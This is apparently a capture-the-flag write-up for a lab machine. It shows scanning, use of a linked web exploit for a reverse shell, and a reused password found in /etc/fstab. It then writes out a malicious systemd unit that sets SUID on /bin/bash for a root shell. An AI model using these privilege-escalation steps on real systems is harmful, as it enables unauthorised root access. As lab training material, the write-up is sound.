Inital scans showed 22 and 12340 ports open
12340 had a 404 content not found pae
dirsearch revealed a webpage, and admin login and all
regardless, it was the rms (restaurant management system) that we had to lookup for exploiting
Found an exploit in a walkthrough, https://github.com/BJConway/thm_writeups/blob/main/challenges/zeno/rms_exploit.py
once we copied and modified IP and port params, `python rms_exploit.py`
reverse shell www-data!
Inside, even after painstaking looking, couldnt find anything
walkthrough suggested linpeas showed /etc/fstab file with password
checked the password, it was for "zeno", but our user was edward, and it still worked!
ssh to edward@ip, that password.
edward had sudo -l /usr/sbin/restart capability
And a writable service /etc/systemd/system/xeno-monitoring.service
and the file at /etc/fstab showed /mnt/secret-share to be writable
we created the below file there

```
[Unit]
Description=root

[Service]
Type=simple
User=root
ExecStart=/usr/bin/chmod +s /bin/bash

[Install]
WantedBy=multi-user.target
```

The ExecStart part is chaged, so that the user edward doesnt need password

`cat temp.service > /etc/systemd/system/xeno-monitoring.service`
to modify the actual writable service file

then to get it into effect, restart with `sudo /usr/sbin/restart`
when we log back into ssh edward@ip, ls -l /bin/bash show SUID set
now, `/bin/bash -p` to get root shell!